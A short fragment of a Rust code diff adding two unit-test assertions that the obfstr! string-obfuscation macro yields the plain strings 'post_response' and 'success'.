+        assert_eq!(obfstr!("post_response"), "post_response");
+        assert_eq!(obfstr!("success"), "success");
     }
 }
 
